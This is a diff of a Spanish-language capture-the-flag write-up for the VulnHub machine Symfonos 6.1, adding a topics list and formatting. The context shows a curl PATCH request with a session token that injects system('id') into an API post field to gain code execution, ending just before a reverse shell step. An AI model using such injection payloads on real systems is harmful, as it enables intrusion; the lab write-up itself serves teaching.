@@ -2,9 +2,12 @@
 
 Hoy vamos a resolver la maquina Symfonos 6.1, donde estaremos tocando conceptos de explotación a través de XXS y una intensa enumeración de ciertos servicios montados en un servidor web.
 
+***
+
 - Plataforma/Source: [VulnHub](https://www.vulnhub.com/entry/symfonos-61,458/)
 - Dificultad: Medium/Hard
 - Meta: Obtener un shell root, es decir (root@localhost:~#) y luego obtener la bandera en /root
+- Temas: `XSS`, `API enumeration`, `CSRF`, `RCE`, `Linux PrivEsc`
 
 ***
 ***
@@ -291,12 +294,14 @@ func ApplyRoutes(r *gin.RouterGroup) {
 ~~~
 - Requerimos llenar el campo `text` con nuestro texto, intentaremos ejecutar un comando con esto mismo.
 - Debemos usar `$` en la petición para que nos interprete el escape de las comillas simples, pues no podemos usar dobles comillas:
+
 ~~~ bash 
 ┌──(kali💀Dedsec)-[~/…/symfonos-api/api/v1.0/posts]
 └─$ curl -X PATCH 'http://symfonos.vh:5000/ls2o4g/v1.0/posts/1' -b "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MDI0OTIxODYsInVzZXIiOnsiZGlzcGxheV9uYW1lIjoiYWNoaWxsZXMiLCJpZCI6MSwidXNlcm5hbWUiOiJhY2hpbGxlcyJ9fQ.MC2SfVYDK_cIPXYL93IdLm0E0rJF_onuiV7aWd_OCdw" -d $'{"text": "system(\'id\')"}';echo
 
 {"created_at":"2020-04-02T04:41:22-04:00","id":1,"text":"system('id')","user":{"display_name":"achilles","id":1,"username":"achilles"}}
 ~~~
+
 ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/523e39a7-7ab3-4b16-abe2-3a83def77f75)
 
 - Y ahí tenemos nuestra RCE, para entablar conexión al server simplemente bastaría ordenar mandarnos una revshell, de la siguiente manera:
